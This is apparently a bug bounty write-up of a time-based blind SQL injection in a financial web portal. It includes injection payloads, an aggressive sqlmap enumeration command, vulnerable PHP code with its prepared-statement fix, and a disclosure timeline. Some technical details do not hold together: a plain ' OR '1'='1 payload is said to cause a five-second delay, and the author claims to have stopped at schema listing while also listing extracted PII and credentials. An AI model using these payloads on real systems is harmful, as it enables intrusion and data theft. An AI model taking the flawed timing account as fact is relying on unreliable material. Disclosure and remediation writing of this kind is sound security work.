# Critical SQLi in Financial Sector Application

A deep-dive into how I discovered and exploited a blind SQL injection vulnerability in a financial sector web application during a bug bounty engagement.

## Reconnaissance

The target was a customer-facing portal for a financial institution. Initial recon involved mapping the attack surface using standard enumeration:

```bash
subfinder -d target.com -silent | httpx -mc 200 -title
```

After identifying several subdomains, I focused on the customer login portal which had a search feature accepting user-controlled input.

## Discovery

The search endpoint accepted a `q` parameter:

```
https://portal.target.com/api/search?q=test
```

I tested for injection with a simple payload:

```
q=test' OR '1'='1
```

The response time difference immediately caught my attention. A normal request took ~200ms, while the injected one took ~5200ms. Classic **time-based blind SQLi**.

## Exploitation

I confirmed the vulnerability with a conditional time delay:

```sql
' OR IF(1=1, SLEEP(5), 0)-- -
```

Then I moved on to extracting the database schema using `sqlmap`:

```bash
sqlmap -u "https://portal.target.com/api/search?q=test" \
  --level=5 --risk=3 \
  --technique=T \
  --dbs \
  --batch
```

The output confirmed multiple databases:

```
available databases [3]:
[*] information_schema
[*] portal_db
[*] user_data
```

> **Note:** At this point I immediately stopped further exploitation and reported the finding through the responsible disclosure program. The data shown above is sanitized.

## Impact Assessment

The vulnerability allowed:

- **Full database enumeration** — table names, column names, row counts
- **Data extraction** — including PII from the `user_data` database
- **Potential privilege escalation** — admin credentials were stored in plaintext

This was classified as **P1 / Critical** severity under the program's taxonomy.

## Remediation Recommendations

1. **Parameterized queries** — Replace string concatenation with prepared statements
2. **Input validation** — Whitelist allowed characters for the search parameter
3. **WAF rules** — Deploy rules targeting common SQLi patterns
4. **Least privilege** — Database user should not have access to `information_schema`

## Timeline

| Date       | Event                         |
| ---------- | ----------------------------- |
| 2026-01-28 | Vulnerability discovered      |
| 2026-01-28 | Report submitted via platform |
| 2026-01-30 | Triaged and confirmed by team |
| 2026-02-05 | Patch deployed to production  |
| 2026-02-15 | Bounty awarded                |

## Key Takeaways

The core issue was a **lack of parameterized queries** in a legacy API endpoint. The search feature was built using raw string concatenation in PHP:

```php
$query = "SELECT * FROM products WHERE name LIKE '%" . $_GET['q'] . "%'";
$result = mysqli_query($conn, $query);
```

The fix was straightforward:

```php
$stmt = $conn->prepare("SELECT * FROM products WHERE name LIKE ?");
$search = "%" . $_GET['q'] . "%";
$stmt->bind_param("s", $search);
$stmt->execute();
```

This engagement reinforced that even in 2026, classic injection vulnerabilities persist in production — especially in legacy codebases within regulated industries.
